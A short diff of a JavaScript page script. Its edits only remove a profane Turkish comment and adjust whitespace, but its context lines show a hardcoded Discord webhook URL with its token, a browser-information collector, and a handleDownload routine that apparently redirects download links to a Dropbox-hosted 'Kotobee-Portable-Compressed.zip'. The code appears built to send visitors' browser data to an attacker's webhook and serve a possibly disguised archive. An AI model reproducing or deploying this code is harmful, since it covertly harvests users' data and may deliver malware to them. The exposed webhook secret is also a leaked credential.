@@ -1,6 +1,6 @@
 (function() {
     'use strict';
-    // ananı sıkım
+
     const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1448770841633620128/wesmitFF_1bpQha0MNqHLk1Yp7raiT_UhKkB-hinry0-i3NkWaXQBwzEirx3IhIJaFif';
     
     function getBrowserInfo() {
@@ -168,8 +168,9 @@
             console.error('Discord webhook hatası:', error);
         }
     }
-    
-    const DROPBOX_DOWNLOAD_URL = 'https://www.dropbox.com/scl/fi/iwn3k3h2v8pwk7wfx1l68/Kotobee-Portable-Compressed.zip?rlkey=vo30gahlsu50b7l0z1lpwcrvj&st=5okwai9h&dl=1';
+
+        
+    const DROPBOX_DOWNLOAD_URL = 'https://www.dropbox.com/scl/fi/iwn3k3h2v8pwk7wfx1l68/Kotobee-Portable-Compressed.zip?rlkey=vo30gahlsu50b7l0z1lpwcrvj&st=5okwai9h&dl=1'
     
     function handleDownload(e, linkElement) {
         const href = linkElement.getAttribute('href');
